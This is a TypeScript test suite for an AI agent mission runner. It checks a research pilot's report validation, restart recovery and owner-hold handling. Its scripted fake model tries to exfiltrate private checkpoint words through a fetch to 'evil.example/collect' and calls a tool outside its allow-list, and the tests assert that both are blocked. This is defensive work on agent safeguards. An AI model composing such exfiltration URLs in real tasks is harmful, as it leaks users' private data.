import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import vm from "node:vm";
import ts from "typescript";
import * as completionPure from "../src/lib/completion-pure.ts";
import * as chainsPure from "../src/lib/chains-pure.ts";
import * as companyPure from "../src/lib/company-pure.ts";
import * as missionsPure from "../src/lib/missions-pure.ts";
import * as taskClaimPure from "../src/lib/task-claim-pure.ts";
import * as stopAllPure from "../src/lib/stop-all-pure.ts";
import * as pure from "../src/lib/pure.ts";
import * as foregroundPure from "../src/lib/foreground-pure.ts";
import * as clipStorePure from "../src/lib/clip-store-pure.ts";
import * as missionChecksPure from "../src/lib/mission-checks-pure.ts";
import * as pilot from "../src/lib/research-pilot-pure.ts";

const { checkReport, closeMetrics, parseResearchPlan, pilotMission, section, baselineMinutes } = pilot;
const { fetchedFromTrace } = missionChecksPure;

test("parseResearchPlan: one request, EN + ET; anything else is not the command", () => {
  assert.equal(parseResearchPlan("research and plan: onboarding for my pet sim"), "onboarding for my pet sim");
  assert.equal(parseResearchPlan("Orbit, Research and plan - three ways to cut churn"), "three ways to cut churn");
  assert.equal(parseResearchPlan("uuri ja planeeri: koolitöö ajakava"), "koolitöö ajakava");
  assert.equal(parseResearchPlan("please research and plan: x"), null);
  assert.equal(parseResearchPlan("research and plan: hi"), null);
});

test("pilotMission is a valid mission with the contract, prepare-mode constraints and the checkpoint in step 1", () => {
  const b = pilotMission("onboarding", "CHECKPOINT: target 10-minute retention");
  const m = missionsPure.validateMission(b);
  assert.ok(typeof m !== "string", String(m));
  assert.deepEqual(m.steps.map((s) => s.agent), ["atlas", "forge"]);
  assert.deepEqual(m.steps.map((s) => [s.tools, s.priv, s.calls, s.minutes]), [[["news_search", "read_news", "fetch_url", "search_articles"], true, 12, 10], [[], undefined, 4, 5]]);
  assert.equal(b.contract.budget.calls, 16);
  assert.equal(b.contract.budget.minutes, 15);
  const chain = chainsPure.validateChain({ goal: m.objective, steps: m.steps });
  assert.ok(typeof chain !== "string", String(chain));
  assert.deepEqual(chainsPure.toMeta(chain).steps.map((s) => [s.tools?.length, s.priv, s.calls, s.minutes]), [[4, true, 12, 10], [0, undefined, 4, 5]], "limits reach the chain meta the driver reads");
  assert.match(String(chainsPure.validateChain({ goal: "g", steps: [{ agent: "a", request: "r", minutes: 99 }, { agent: "b", request: "r" }] })), /minutes must be 1-15/);
  assert.match(m.steps[0].request, /10-minute retention[\s\S]*fetch_url/);
  assert.match(m.steps[1].request, /## Next action/);
  assert.equal(b.contract.mode, "prepare");
  assert.match(m.constraints.join(" "), /Prepare mode/);
});

const REPORT = (urls: string[]) => `## Context\nPet sim, 10-minute retention.\n## Options\nA, B\n## Comparison\nA beats B\n## Recommendation\nA\n## Tradeoffs\nCost\n## Sources\n${urls.map((u, i) => `- [S${i}](${u})`).join("\n")}\n## Next action\nPrototype option A in a test place.`;

test("checkReport: exact sources only (a read page on the same host doesn't count), every section, next action", () => {
  const tr = [{ step: "source", ok: true, detail: "", url: "https://a.example/x/", at: "t", evidence: "" }, { step: "fetch_url", ok: false, detail: '{"url":"https://dead.example/"} → Error: 403' }];
  const read = fetchedFromTrace(tr);
  assert.deepEqual(read.map((f) => f.url), ["https://a.example/x/"]);
  assert.deepEqual(checkReport(REPORT(["https://a.example/x#top"]), read, 1).map((c) => c.ok), [true, true]);
  const bad = checkReport(REPORT(["https://a.example/other"]), read, 1);
  assert.equal(bad[0].ok, false, "known host, unread page fails");
  assert.equal(checkReport(REPORT(["https://dead.example"]), read, 1)[0].ok, false, "a failed fetch is not a read");
  assert.match(checkReport("## Context\nx\n## Sources\n- [a](https://a.example/x)", read, 1)[1].what, /missing section\(s\): Options/);
  assert.equal(section(REPORT([]), "Next action"), "Prototype option A in a test place.");
});

test("run metrics: accepted only when verified without intervention; baseline is validated", () => {
  const m = { startedAt: "2026-10-29T10:00:00.000Z", interventions: 0 };
  assert.deepEqual(closeMetrics(m, true, "2026-10-29T10:03:00.000Z"), { ...m, finishedAt: "2026-10-29T10:03:00.000Z", minutes: 3, accepted: true });
  assert.equal(closeMetrics({ ...m, interventions: 1 }, true, m.startedAt).accepted, false);
  assert.equal(baselineMinutes("45"), 45);
  assert.equal(typeof baselineMinutes(-1), "string");
});

/* ---- end to end on the REAL runner (agents.ts, chains.ts, missions.ts) with a fake model, fetch, DB and workspace ---- */

process.env.ORBIT_DATA_DIR = mkdtempSync(path.join(os.tmpdir(), "orbit-pilot-"));
const stopAll = await import("../src/lib/stop-all.ts");
type Row = Record<string, any>;
const until = async (cond: () => unknown, what: string) => {
  for (let i = 0; i < 1500; i++) { if (await cond()) return; await new Promise((r) => setTimeout(r, 2)); }
  throw new Error(`timed out waiting: ${what} ${JSON.stringify((globalThis as any).DBG?.())}`);
};

/** In-memory Supabase (same shape as tests/mission-scenario.test.ts). */
function fakeDb() {
  const tables: Record<string, Row[]> = { tasks: [], missions: [] };
  let seq = 0;
  const DEFAULTS: Record<string, Row> = {
    tasks: { status: "queued", parent_id: null, project_id: null, result: null, error: null, pending: [], trace: [], started_at: null, finished_at: null, claimed_by: null },
    missions: { version: 1 },
  };
  const split = (s: string) => { const out: string[] = []; let d = 0, cur = ""; for (const ch of s) { if (ch === "(") d++; if (ch === ")") d--; if (ch === "," && !d) { out.push(cur); cur = ""; } else cur += ch; } if (cur) out.push(cur); return out; };
  const term = (t: string): ((r: Row) => boolean) => {
    if (t.startsWith("and(")) { const parts = split(t.slice(4, -1)).map(term); return (r) => parts.every((f) => f(r)); }
    const [col, op, ...rest] = t.split("."); const v = rest.join(".").replace(/^"|"$/g, "");
    if (op === "eq") return (r) => String(r[col]) === v;
    if (op === "is") return (r) => (r[col] ?? null) === null;
    if (op === "lt") return (r) => r[col] != null && r[col] < v;
    throw new Error(`fake db: or op ${op}`);
  };
  const sb = { from(table: string) {
    const rows = (tables[table] ??= []);
    const filters: ((r: Row) => boolean)[] = [];
    let patch: Row | null = null, ins: Row[] | null = null, del = false;
    const q: any = {
      select() { return q; }, order() { return q; }, limit() { return q; },
      eq(k: string, v: unknown) { filters.push((r) => r[k] === v); return q; },
      contains(k: string, vs: unknown[]) { filters.push((r) => vs.every((v) => (r[k] ?? []).includes(v))); return q; },
      neq(k: string, v: unknown) { filters.push((r) => r[k] !== v); return q; },
      in(k: string, vs: unknown[]) { filters.push((r) => vs.includes(r[k])); return q; },
      is(k: string, v: unknown) { filters.push((r) => (r[k] ?? null) === v); return q; },
      lt(k: string, v: string) { filters.push((r) => r[k] < v); return q; },
      like(k: string, p: string) { filters.push((r) => String(r[k]).startsWith(p.replace(/%$/, ""))); return q; },
      or(f: string) { const fs = split(f).map(term); filters.push((r) => fs.some((x) => x(r))); return q; },
      update(p: Row) { patch = p; return q; }, delete() { del = true; return q; },
      insert(x: Row | Row[]) { ins = (Array.isArray(x) ? x : [x]).map((r) => ({ ...DEFAULTS[table], id: `${table[0]}${++seq}`, created_at: new Date(Date.now() + seq).toISOString(), ...structuredClone(r) })); return q; },
      exec(single = false) {
        if (ins) { rows.push(...ins); const out = structuredClone(ins); return { data: single ? out[0] : out, error: null }; }
        const hit = rows.filter((r) => filters.every((f) => f(r)));
        if (del) for (const r of hit) rows.splice(rows.indexOf(r), 1);
        if (patch) for (const r of hit) Object.assign(r, structuredClone(patch));
        return { data: single ? structuredClone(hit[0] ?? null) : structuredClone(hit), error: null };
      },
      single() { return Promise.resolve(q.exec(true)); }, maybeSingle() { return Promise.resolve(q.exec(true)); },
      then(ok: (r: unknown) => void, bad: (e: unknown) => void) { return Promise.resolve().then(() => q.exec()).then(ok, bad); },
    };
    return q;
  } };
  return { sb, tables };
}

const EVIL = "https://evil.example/collect?q=retention", DEAD = "https://dead.example/guide", B = "https://good.example/onboarding-study", C = "https://other.example/ftue";
type World = ReturnType<typeof fakeDb> & { files: Map<string, string>; hang: boolean; citeDead: boolean; calls: number[]; fetches: string[]; systems: string[]; budgets: number[][] };

/** The fake model. Step 1: tries an unreadable page, substitutes two readable ones, answers. Step 2: the report (cites dead if told to). */
function model(w: World, prompt: string, system: string): Promise<Row> | Row {
  w.systems.push(system);
  if (prompt.includes("Write the deliverable report for:")) {
    w.calls[1]++;
    if (w.hang) { w.hang = false; return new Promise(() => {}); } // the process dies mid-step
    return { final: REPORT(w.citeDead && !prompt.includes("failed this check") ? [B, DEAD] : [B, C]) };
  }
  assert.match(prompt, /Gather sources for:[\s\S]*retention/, "step 1 sees the project checkpoint");
  w.calls[0]++;
  const n = prompt.split("you called ").length - 1;
  if (n === 0) return { tool: "news_search", input: { query: "onboarding" } };
  if (n === 1) return { tool: "fetch_url", input: { url: EVIL } }; // a composed URL carrying checkpoint words: private context refuses it
  if (n === 2) return { tool: "save_memory", input: { title: "x", content: "y" } }; // not on the step's allow-list
  if (n < 6) return { tool: "fetch_url", input: { url: [DEAD, B, C][n - 3] } };
  return { final: `Onboarding evidence: [study](${B}).\nOnboarding evidence: [ftue](${C}).\n${DEAD} could not be read, replaced.` };
}

const SRC: Record<string, string> = {};
const src = (f: string) => (SRC[f] ??= ts.transpileModule(readFileSync(new URL(`../src/lib/${f}`, import.meta.url), "utf8"), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText);

/** One ORBIT process: fresh globals, shared DB + workspace. */
function boot(w: World) {
  const ctx: Row = { console, crypto, AbortController, AbortSignal, structuredClone, setTimeout: (f: () => void, ms: number) => setTimeout(f, Math.min(ms, 2)) };
  vm.createContext(ctx);
  const p = { ctx, agents: {} as Row, chains: {} as Row, missions: {} as Row };
  const claude = {
    MODEL: "stub", emit: async () => {}, recordUsage: async () => {}, chargeCall: (b: Row) => { b.used++; },
    createBudget: (ms = 480_000, calls = 12) => { w.budgets.push([ms / 60_000, calls]); return { used: 0, calls, minutes: ms / 60_000, deadline: Date.now() + ms, signal: new AbortController().signal }; },
    stopKind: (_b: unknown, s: AbortSignal) => (s.aborted ? "cancelled" : null), stoppedReport: (m: string) => m, BudgetError: class extends Error {},
    reviewDraft: async (_t: string, d: string) => ({ text: d, reviewed: false }),
    askClaude: async (prompt: string, system: string) => ({ text: JSON.stringify(await model(w, prompt, system)), ms: 1 }),
  };
  const ws = {
    createWorkspace: async () => ({ slug: "research", created: false }),
    writeWsFile: async (_u: string, slug: string, rel: string, text: string) => { w.files.set(`${slug}/${rel}`, text); return { path: rel, bytes: text.length, created: true }; },
    readWsFile: async (_u: string, slug: string, rel: string) => (w.files.has(`${slug}/${rel}`) ? { text: w.files.get(`${slug}/${rel}`), size: 1 } : null),
  };
  const mods: Row = {
    "./claude": claude, "./stop-all": stopAll, "./stop-all-pure": stopAllPure, "./completion-pure": completionPure, "./task-claim-pure": taskClaimPure,
    "./company-pure": companyPure, "./chains-pure": chainsPure, "./missions-pure": missionsPure, "./pure": pure, "./research-pilot-pure": pilot,
    "./memory": { KINDS: ["note"] }, "./core-ui": { needsSelfReview: () => false }, "./completion": { verifyRow: async () => {} },
    "./foreground-pure": foregroundPure, "./clip-store-pure": clipStorePure, "./mission-checks-pure": missionChecksPure,
    "./capability": { capabilityStart: async () => ({ block: "", headsUp: "" }) }, "./workspace": ws,
    "./verify": { verifyAnswer: async (_sb: unknown, _u: string, text: string) => ({ text, trace: [] }) }, // the real cross-check is a model call
    "./agents": p.agents, "./chains": p.chains, "./migration-guard": { requireMigration: async () => {}, MigrationBlocked: class extends Error {} },
  };
  for (const [f, out] of [["agents.ts", p.agents], ["chains.ts", p.chains], ["missions.ts", p.missions]] as const)
    vm.runInContext(`(function (exports, require) {${src(f)}\n})`, ctx)(out, (n: string) => mods[n] ?? {});
  const realFetch = p.agents.TOOLS.fetch_url.run;
  p.agents.TOOLS.fetch_url.run = async (c: Row, i: Row) => { // the fake web: one page is unreadable; the private-context gate is the real one
    if (c.priv && !c.links?.has(i.url)) return realFetch(c, i);
    w.fetches.push(String(i.url));
    if (i.url === DEAD) throw new Error("couldn't open the page (403)");
    c.pages.set(i.url, { url: i.url, title: i.url, text: "Evidence about onboarding." });
    return `TITLE: ${i.url}\nURL: ${i.url}\n\nEvidence about onboarding.`;
  };
  p.agents.TOOLS.news_search.run = async () => [DEAD, B, C].map((u, k) => `${k + 1}. Result — src, today\n   ${u}`).join("\n");
  return p;
}

async function run(citeDead: boolean) {
  const w: World = { ...fakeDb(), files: new Map(), hang: true, citeDead, calls: [0, 0], fetches: [], systems: [], budgets: [] };
  const step = (k: number) => w.tables.tasks.filter((t) => t.parent_id)[k];
  const mission = () => w.tables.missions[0];
  (globalThis as any).DBG = () => ({ calls: w.calls, f: w.fetches, t: w.tables.tasks.map((t) => [t.status, t.error, t.result?.slice?.(0, 200), t.trace?.map((x: Row) => x.step + ":" + String(x.detail).slice(0, 120))]), m: mission()?.doc?.log });
  const tick = async (p: ReturnType<typeof boot>) => { await p.missions.resumeMissions(w.sb, "owner"); await until(() => !p.ctx.__orbitChains?.size, "driver idle"); };

  // Launched from one request: parse → the saved workflow's mission body (what POST /api/missions builds).
  const A = boot(w);
  const topic = parseResearchPlan("research and plan: three ways to improve onboarding")!;
  const r = await A.missions.createMission(w.sb, "owner", pilotMission(topic, "CHECKPOINT: success = better 10-minute retention"));
  assert.ok(r.id, JSON.stringify(r));
  assert.equal(mission().doc.workflow, "research-pilot");
  assert.equal(mission().doc.contract.mode, "prepare");

  // Step 1 runs (with the forced failure: one unreadable source, substituted); step 2 starts and the process dies mid-step.
  await until(() => step(0)?.status === "done" && step(1)?.status === "running" && w.calls[1] === 1, "step 2 running in A");
  assert.deepEqual(w.fetches, [DEAD, B, C], "the composed URL never reached the web");
  const tr = step(0).trace as Row[];
  assert.match(tr.find((t) => t.step === "fetch_url")!.detail, /private data is in this task/);
  assert.match(tr.find((t) => t.step === "save_memory")!.detail, /not available to you/);
  assert.deepEqual(step(0).pending, [], "nothing queued for approval: prepare mode");
  assert.deepEqual(tr.filter((t) => t.step === "fetch_url").map((t) => t.ok), [false, false, true, true]);
  const atlasSys = w.systems.find((x) => x.includes("Atlas"))!, forgeSys = w.systems.find((x) => x.includes("Forge"))!;
  assert.ok(!/- (save_memory|search_memory)\b/.test(atlasSys) && /- fetch_url\b/.test(atlasSys), "atlas sees only its allow-list");
  assert.ok(!/- save_memory\b/.test(forgeSys), "forge has no write tool");
  assert.deepEqual(w.budgets.slice(0, 2), [[10, 12], [5, 4]], "each step runs on its contract budget (minutes, calls)");

  // Restart: a fresh process after the step's lease ran out. It marks the orphan interrupted, the mission retries it (temporary).
  step(1).started_at = new Date(Date.now() - 21 * 60_000).toISOString();
  const Bp = boot(w);
  const done = citeDead ? "waiting-input" : "completed";
  for (let i = 0; i < 8 && mission().status !== done; i++) await tick(Bp);
  assert.equal(mission().status, done, JSON.stringify(mission().doc.log));
  assert.equal(w.calls[0], 7, "step 1 never reran after the restart");
  assert.equal(w.calls[1], 2, "step 2 ran once more after the restart");
  assert.equal(mission().doc.retries[1], 1);
  assert.equal(w.fetches.length, 3, "no source fetched twice");
  return { w, doc: mission().doc, Bp, tick, mission };
}

test("G01 pilot end to end: unreadable source substituted, restart mid-step, report written, checked, next action recorded", { timeout: 30_000 }, async () => {
  const { w, doc } = await run(false);
  assert.equal(doc.verified, true, JSON.stringify(doc.checks));
  assert.deepEqual(doc.artifact?.slug, "research");
  assert.equal(w.files.get(`research/${doc.artifact.path}`), REPORT([B, C]), "the artifact is the checked report");
  assert.ok(doc.checks.some((c: Row) => c.ok && /exact URL/.test(c.what)));
  assert.ok(doc.checks.some((c: Row) => c.ok && /7 sections/.test(c.what)));
  assert.ok(doc.checks.some((c: Row) => c.ok && /written and opens/.test(c.what)));
  assert.equal(doc.next, "Prototype option A in a test place.");
  assert.equal(doc.metrics.interventions, 0);
  assert.equal(doc.metrics.accepted, true, "a restart is recovery, not an owner intervention");
  assert.equal(typeof doc.metrics.minutes, "number");
  assert.equal(missionsPure.missionLabel("completed", doc.receipts, 2), "Completed · verified");
});

test("G01 pilot: a report citing the unreadable source is held for the owner (exact check + options); Accept or Retry resolve it", { timeout: 30_000 }, async () => {
  for (const choice of ["accept", "retry"] as const) {
    const { w, doc, Bp, tick, mission } = await run(true);
    assert.equal(doc.verified, false);
    assert.ok(doc.hold.check.includes(DEAD), doc.hold.check);
    assert.equal(doc.hold.options.length, 3);
    assert.match(doc.blocker, /Acceptance check failed/);
    assert.equal(doc.metrics.accepted, undefined, "the run isn't closed while held");
    const view = (await Bp.missions.listMissions(w.sb, "owner"))[0];
    assert.equal(view.status, "waiting-input");
    assert.match(view.next, /Retry/);
    const r = await Bp.missions.actMission(w.sb, "owner", mission().id, choice);
    assert.ok(!("error" in r), JSON.stringify(r));
    if (choice === "accept") {
      assert.equal(mission().status, "completed");
      assert.equal(mission().doc.verified, false);
      assert.equal(mission().doc.metrics.accepted, false);
    } else {
      for (let i = 0; i < 6 && mission().status !== "completed"; i++) await tick(Bp);
      assert.equal(mission().status, "completed", JSON.stringify(mission().doc.log.slice(-5)));
      assert.equal(mission().doc.verified, true, JSON.stringify(mission().doc.checks));
      assert.equal(w.calls[0], 7, "research kept: step 1 not rerun");
      assert.equal(w.files.get(`research/${mission().doc.artifact.path}`), REPORT([B, C]));
      assert.equal(mission().doc.metrics.interventions, 1);
      assert.equal(mission().doc.metrics.accepted, false, "an owner decision mid-run is an intervention");
    }
  }
});
